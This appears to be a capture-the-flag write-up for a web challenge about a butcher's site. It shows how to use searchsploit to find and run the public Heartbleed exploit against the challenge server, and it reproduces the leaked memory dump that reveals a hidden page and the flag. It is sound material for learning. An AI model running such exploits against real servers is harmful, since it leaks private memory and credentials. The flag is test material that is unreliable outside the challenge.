# Saignant ma viande

## Description

> Une boucherie vend de la viande (qui a l'air très bonne) sur un site internet. Un hunter anonyme vous a transmis ce message : *Le site est bizarre et les commentaires aussi.... je suis sur qu'il cache une autre facette de vente.

Url : https://135.125.232.20:8443/

First thing when arriving on the website, the footer indicates

> This website is running since 2014.

and we are pompted to accept the signed certificate.

Navigating to `robots.txt` :

```html
User-Agent: *
Disallow: 

#To admin : We have to upgrade the version of openssl.
```

Seems like we will have to exploit an `openssl` CVE.

Using `searchsploit` to find the possible CVE exploit.

```bash
$ searchsploit openssl
OpenSSL TLS Heartbeat Extension - 'Heartbleed' Information Leak (1)                                                                                          | multiple/remote/32791.c
OpenSSL TLS Heartbeat Extension - 'Heartbleed' Information Leak (2) (DTLS Support)                                                                           | multiple/remote/32998.c
OpenSSL TLS Heartbeat Extension - 'Heartbleed' Memory Disclosure                                                                                             | multiple/remote/32745.py
```

To download one of the scripts, you juste have to do so :

```bash
$ searchsploit -m exploits/multiple/remote/32745.py
```

And to use it :

```bash
$ python2 32745.py 135.125.232.20 -p 8443
```

Looking at the firsts frames, we can see something interesting :

```
  0100: 03 02 01 02 02 02 03 00 0F 00 01 01 3D 30 2E 38  ............=0.8
  0110: 0D 0A 41 63 63 65 70 74 2D 4C 61 6E 67 75 61 67  ..Accept-Languag
  0120: 65 3A 20 65 6E 2D 55 53 2C 65 6E 3B 71 3D 30 2E  e: en-US,en;q=0.
  0130: 35 0D 0A 41 63 63 65 70 74 2D 45 6E 63 6F 64 69  5..Accept-Encodi
  0140: 6E 67 3A 20 67 7A 69 70 2C 20 64 65 66 6C 61 74  ng: gzip, deflat
  0150: 65 2C 20 62 72 0D 0A 43 6F 6E 6E 65 63 74 69 6F  e, br..Connectio
  0160: 6E 3A 20 6B 65 65 70 2D 61 6C 69 76 65 0D 0A 52  n: keep-alive..R
  0170: 65 66 65 72 65 72 3A 20 68 74 74 70 73 3A 2F 2F  eferer: https://
  0180: 31 33 35 2E 31 32 35 2E 32 33 32 2E 32 30 3A 38  135.125.232.20:8
  0190: 34 34 33 2F 37 63 66 38 61 30 30 32 64 62 63 30  443/7cf8a002dbc0
  01a0: 38 63 33 66 33 31 61 63 61 36 31 39 31 34 31 64  8c3f31aca619141d
  01b0: 31 34 31 64 2F 0D 0A 55 70 67 72 61 64 65 2D 49  141d/..Upgrade-I
  01c0: 6E 73 65 63 75 72 65 2D 52 65 71 75 65 73 74 73  nsecure-Requests
```

A request to a page on the web server to this : `https://135.125.232.20:8443/7cf8a002dbc08c3f31aca619141d141d/`.

After navigating to the page, it appears to be mmm... a not so legal website where you can buy guns ...

The flag appears when you try to buy a gun.

> Wait for us to verify your identity. Here is your id : `MCTF{t0nt0n_fl1ngu3rs_g3t_pwn3d}`